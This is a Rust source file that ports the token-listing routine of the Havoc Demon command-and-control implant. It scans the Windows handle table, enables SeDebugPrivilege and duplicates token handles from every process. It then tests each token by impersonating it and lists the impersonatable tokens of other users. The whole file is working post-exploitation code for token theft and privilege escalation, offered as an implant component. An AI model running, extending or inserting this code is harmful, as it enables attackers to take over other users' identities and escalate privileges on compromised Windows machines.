//! System-wide token enumeration via NT handle scanning.
//!
//! Implements the `ListTokens()` logic from the Havoc Demon's `src/core/Token.c`:
//! scans `NtQuerySystemInformation(SystemHandleInformation)`, collects unique PIDs,
//! opens each process, duplicates every token-type handle via `NtDuplicateObject`,
//! tests impersonatability, and deduplicates results.

use std::mem;
use std::ptr;

use windows_sys::Win32::Foundation::{
    CloseHandle, FALSE, GetLastError, HANDLE, STATUS_INFO_LENGTH_MISMATCH, STATUS_SUCCESS, TRUE,
};
use windows_sys::Win32::Security::{
    GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation, ImpersonateLoggedOnUser,
    RevertToSelf, SecurityDelegation, SecurityImpersonation, TOKEN_DUPLICATE,
    TOKEN_MANDATORY_LABEL, TOKEN_QUERY, TOKEN_STATISTICS, TokenImpersonation, TokenIntegrityLevel,
    TokenPrimary, TokenStatistics,
};
use windows_sys::Win32::System::SystemServices::MAXIMUM_ALLOWED;
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentProcessId, GetCurrentThread, OpenProcess, OpenProcessToken,
    OpenThreadToken, PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION,
};

use super::super::FoundToken;
use super::{current_token_handle, enable_privilege, query_token_user};

// ─── NT syscall declarations ─────────────────────────────────────────────

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtQuerySystemInformation(
        system_information_class: i32,
        system_information: *mut core::ffi::c_void,
        system_information_length: u32,
        return_length: *mut u32,
    ) -> i32;

    fn NtQueryObject(
        handle: HANDLE,
        object_information_class: i32,
        object_information: *mut core::ffi::c_void,
        object_information_length: u32,
        return_length: *mut u32,
    ) -> i32;

    fn NtDuplicateObject(
        source_process_handle: HANDLE,
        source_handle: HANDLE,
        target_process_handle: HANDLE,
        target_handle: *mut HANDLE,
        desired_access: u32,
        handle_attributes: u32,
        options: u32,
    ) -> i32;
}

// ─── NT struct layouts ───────────────────────────────────────────────────

const SYSTEM_HANDLE_INFORMATION_CLASS: i32 = 16;
const OBJECT_TYPES_INFORMATION_CLASS: i32 = 3;
const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;

/// One entry in the system-wide handle table.
///
/// Layout matches `SYSTEM_HANDLE_TABLE_ENTRY_INFO` on x64 Windows:
/// sizes = [u16, u16, u8, u8, u16, ptr(8), u32] + 4-byte trailing pad = 24 bytes.
#[repr(C)]
struct SystemHandleEntry {
    unique_process_id: u16,
    creator_back_trace_index: u16,
    object_type_index: u8,
    handle_attributes: u8,
    handle_value: u16,
    object: *mut core::ffi::c_void,
    granted_access: u32,
}

// ─── Handle-table helpers ────────────────────────────────────────────────

/// Call `NtQuerySystemInformation(SystemHandleInformation)` and return the
/// raw byte buffer on success, or `None` on failure.
///
/// The buffer starts with a `u32` handle count at offset 0, then 4 bytes of
/// alignment padding, followed by the `SYSTEM_HANDLE_TABLE_ENTRY_INFO` array.
fn get_all_handles() -> Option<Vec<u8>> {
    let mut buf_size: u32 = 0x1_0000; // start at 64 KiB
    loop {
        let mut buf = vec![0u8; buf_size as usize];
        let mut returned: u32 = 0;
        let status = unsafe {
            NtQuerySystemInformation(
                SYSTEM_HANDLE_INFORMATION_CLASS,
                buf.as_mut_ptr().cast(),
                buf_size,
                &mut returned,
            )
        };
        if status == STATUS_SUCCESS {
            return Some(buf);
        }
        if status == STATUS_INFO_LENGTH_MISMATCH {
            buf_size = returned.max(buf_size.saturating_add(0x1_0000));
            continue;
        }
        return None;
    }
}

/// Return the object-type index for `"Token"` objects by calling
/// `NtQueryObject(NULL, ObjectTypesInformation)`.
///
/// On Windows the type index equals `loop_position + 2` (types are 1-indexed
/// starting from 2 in the kernel).
fn get_type_index_token() -> Option<u8> {
    const OBJ_TYPE_INFO_SIZE: usize = 104;
    const TYPE_NAME_LENGTH_OFF: usize = 0;
    const TYPE_NAME_MAX_LENGTH_OFF: usize = 2;
    const TYPE_NAME_BUFFER_OFF: usize = 8;

    let mut buf_size: u32 = 0x1000;
    let buf = loop {
        let mut buf = vec![0u8; buf_size as usize];
        let mut returned: u32 = 0;
        let status = unsafe {
            NtQueryObject(
                ptr::null_mut(),
                OBJECT_TYPES_INFORMATION_CLASS,
                buf.as_mut_ptr().cast(),
                buf_size,
                &mut returned,
            )
        };
        if status == STATUS_SUCCESS {
            break buf;
        }
        if status == STATUS_INFO_LENGTH_MISMATCH {
            buf_size = returned.max(buf_size.saturating_add(0x1000));
            continue;
        }
        return None;
    };

    if buf.len() < 8 {
        return None;
    }
    let number_of_types = u32::from_ne_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;

    let mut offset: usize = 8;

    for i in 0..number_of_types {
        if offset + OBJ_TYPE_INFO_SIZE > buf.len() {
            break;
        }

        let type_name_len = u16::from_ne_bytes([
            buf[offset + TYPE_NAME_LENGTH_OFF],
            buf[offset + TYPE_NAME_LENGTH_OFF + 1],
        ]) as usize;

        let max_len = u16::from_ne_bytes([
            buf[offset + TYPE_NAME_MAX_LENGTH_OFF],
            buf[offset + TYPE_NAME_MAX_LENGTH_OFF + 1],
        ]) as usize;

        let buf_ptr_bytes: [u8; 8] = buf
            [offset + TYPE_NAME_BUFFER_OFF..offset + TYPE_NAME_BUFFER_OFF + 8]
            .try_into()
            .unwrap_or([0u8; 8]);
        let name_ptr = usize::from_ne_bytes(buf_ptr_bytes) as *const u16;

        // "Token" in UTF-16 is 5 code units = 10 bytes.
        if type_name_len == 10 && !name_ptr.is_null() {
            let name_slice = unsafe { std::slice::from_raw_parts(name_ptr, 5) };
            if name_slice == [b'T' as u16, b'o' as u16, b'k' as u16, b'e' as u16, b'n' as u16] {
                #[allow(clippy::cast_possible_truncation)]
                return Some((i + 2) as u8);
            }
        }

        let aligned_name = (max_len + 7) & !7;
        offset = offset.saturating_add(OBJ_TYPE_INFO_SIZE + aligned_name);
    }

    None
}

// ─── Token quality checks ────────────────────────────────────────────────

/// Test whether a token can actually be used for impersonation by trying to
/// impersonate it on the current thread and then reverting.
///
/// Mirrors the Havoc `CanTokenBeImpersonated()` function.
fn can_token_be_impersonated(token: HANDLE) -> bool {
    if unsafe { ImpersonateLoggedOnUser(token) } == FALSE {
        return false;
    }

    let mut imp_token: HANDLE = ptr::null_mut();
    let opened =
        unsafe { OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &mut imp_token) };

    unsafe { RevertToSelf() };

    if opened == FALSE {
        return false;
    }

    let mut stats_buf = vec![0u8; mem::size_of::<TOKEN_STATISTICS>()];
    let mut ret_len: u32 = 0;
    let ok = unsafe {
        GetTokenInformation(
            imp_token,
            TokenStatistics,
            stats_buf.as_mut_ptr().cast(),
            stats_buf.len() as u32,
            &mut ret_len,
        )
    };
    unsafe { CloseHandle(imp_token) };

    if ok == FALSE {
        return false;
    }

    let stats: &TOKEN_STATISTICS = unsafe { &*(stats_buf.as_ptr().cast()) };
    stats.TokenType == TokenImpersonation && stats.ImpersonationLevel >= SecurityImpersonation
}

/// Read `TokenStatistics`, `TokenIntegrityLevel`, and the owner string from
/// a token handle.
///
/// Returns `None` if the token is not suitable for impersonation (wrong type
/// or insufficient impersonation level).
fn token_info_for_find(
    token: HANDLE,
) -> Option<(String, u32 /* type */, u32 /* integrity */, u32 /* imp level */)> {
    // ── 1. TOKEN_STATISTICS → type + impersonation level ─────────────────
    let mut stats_buf = vec![0u8; mem::size_of::<TOKEN_STATISTICS>()];
    let mut ret_len: u32 = 0;
    if unsafe {
        GetTokenInformation(
            token,
            TokenStatistics,
            stats_buf.as_mut_ptr().cast(),
            stats_buf.len() as u32,
            &mut ret_len,
        )
    } == FALSE
    {
        return None;
    }
    let stats: &TOKEN_STATISTICS = unsafe { &*(stats_buf.as_ptr().cast()) };
    let token_type = stats.TokenType as u32;
    let imp_level = stats.ImpersonationLevel as u32;

    let keep = token_type == TokenPrimary as u32
        || imp_level >= SecurityImpersonation as u32
        || imp_level >= SecurityDelegation as u32;
    if !keep {
        return None;
    }

    // ── 2. TOKEN_MANDATORY_LABEL → integrity level ────────────────────────
    let mut integrity: u32 = 0;
    if token_type == TokenPrimary as u32 {
        let mut needed: u32 = 0;
        unsafe { GetTokenInformation(token, TokenIntegrityLevel, ptr::null_mut(), 0, &mut needed) };
        if needed > 0 {
            let mut il_buf = vec![0u8; needed as usize];
            if unsafe {
                GetTokenInformation(
                    token,
                    TokenIntegrityLevel,
                    il_buf.as_mut_ptr().cast(),
                    needed,
                    &mut needed,
                )
            } != FALSE
            {
                let label: &TOKEN_MANDATORY_LABEL = unsafe { &*(il_buf.as_ptr().cast()) };
                if !label.Label.Sid.is_null() {
                    let count = unsafe { *GetSidSubAuthorityCount(label.Label.Sid) } as u32;
                    if count > 0 {
                        integrity = unsafe { *GetSidSubAuthority(label.Label.Sid, count - 1) };
                    }
                }
            }
        }
    }

    // ── 3. Owner string ───────────────────────────────────────────────────
    let owner = query_token_user(token)?;

    Some((owner, token_type, integrity, imp_level))
}

// ─── Deduplication helper ────────────────────────────────────────────────

/// Add `candidate` to `list` only if no existing entry is identical on all
/// five key fields (mirrors `AddUserToken` in the Havoc Demon source).
fn add_unique_found_token(list: &mut Vec<FoundToken>, candidate: FoundToken) {
    for existing in list.iter() {
        let handles_same_class = (existing.handle == 0) == (candidate.handle == 0);
        if existing.domain_user == candidate.domain_user
            && existing.token_type == candidate.token_type
            && existing.integrity_level == candidate.integrity_level
            && existing.impersonation_level == candidate.impersonation_level
            && handles_same_class
        {
            return;
        }
    }
    list.push(candidate);
}

// ─── Public entry point ──────────────────────────────────────────────────

/// Enumerate all impersonatable tokens across every process on the system.
///
/// Requires `SeDebugPrivilege` to open most processes; it is requested before
/// the scan begins (best-effort — tokens without the privilege are silently
/// skipped).
pub fn list_found_tokens() -> Vec<FoundToken> {
    let mut result: Vec<FoundToken> = Vec::new();

    let own_username: Option<String> = current_token_handle().ok().and_then(|h| {
        let user = query_token_user(h);
        unsafe { CloseHandle(h) };
        user
    });

    let _ = enable_privilege("SeDebugPrivilege");

    let token_type_index = match get_type_index_token() {
        Some(idx) => idx,
        None => return result,
    };

    let handle_buf = match get_all_handles() {
        Some(buf) => buf,
        None => return result,
    };

    if handle_buf.len() < 8 {
        return result;
    }

    let num_handles =
        u32::from_ne_bytes([handle_buf[0], handle_buf[1], handle_buf[2], handle_buf[3]]) as usize;

    let entry_size = mem::size_of::<SystemHandleEntry>();
    let entries_needed = 8usize.saturating_add(num_handles.saturating_mul(entry_size));
    if handle_buf.len() < entries_needed {
        return result;
    }

    let entries: &[SystemHandleEntry] = unsafe {
        let ptr = handle_buf.as_ptr().add(8).cast::<SystemHandleEntry>();
        std::slice::from_raw_parts(ptr, num_handles)
    };

    let our_pid = unsafe { GetCurrentProcessId() };
    let mut seen_pids = std::collections::HashSet::new();
    let mut pids: Vec<u32> = Vec::new();
    for entry in entries {
        let pid = entry.unique_process_id as u32;
        if pid == 0 || pid == 4 || pid == our_pid {
            continue;
        }
        if seen_pids.insert(pid) {
            pids.push(pid);
        }
    }

    let current_proc = unsafe { GetCurrentProcess() };

    for pid in pids {
        let proc_handle =
            unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid) };
        if proc_handle.is_null() {
            continue;
        }

        for entry in entries {
            if entry.unique_process_id as u32 != pid {
                continue;
            }
            if entry.object_type_index != token_type_index {
                continue;
            }

            let src_handle = entry.handle_value as usize as HANDLE;
            let mut dup: HANDLE = ptr::null_mut();
            let status = unsafe {
                NtDuplicateObject(
                    proc_handle,
                    src_handle,
                    current_proc,
                    &mut dup,
                    0,
                    0,
                    DUPLICATE_SAME_ACCESS,
                )
            };
            if status != STATUS_SUCCESS {
                continue;
            }

            if let Some((owner, tok_type, integrity, imp)) = token_info_for_find(dup) {
                let is_self = own_username.as_deref().map(|u| u == owner).unwrap_or(false);
                if !is_self && can_token_be_impersonated(dup) {
                    add_unique_found_token(
                        &mut result,
                        FoundToken {
                            domain_user: owner,
                            process_id: pid,
                            handle: entry.handle_value as u32,
                            integrity_level: integrity,
                            impersonation_level: imp,
                            token_type: tok_type,
                        },
                    );
                }
            }

            unsafe { CloseHandle(dup) };
        }

        let mut prim: HANDLE = ptr::null_mut();
        if unsafe { OpenProcessToken(proc_handle, TOKEN_DUPLICATE | TOKEN_QUERY, &mut prim) }
            != FALSE
        {
            if let Some((owner, tok_type, integrity, imp)) = token_info_for_find(prim) {
                let is_self = own_username.as_deref().map(|u| u == owner).unwrap_or(false);
                if !is_self && can_token_be_impersonated(prim) {
                    add_unique_found_token(
                        &mut result,
                        FoundToken {
                            domain_user: owner,
                            process_id: pid,
                            handle: 0,
                            integrity_level: integrity,
                            impersonation_level: imp,
                            token_type: tok_type,
                        },
                    );
                }
            }
            unsafe { CloseHandle(prim) };
        }

        unsafe { CloseHandle(proc_handle) };
    }

    result
}
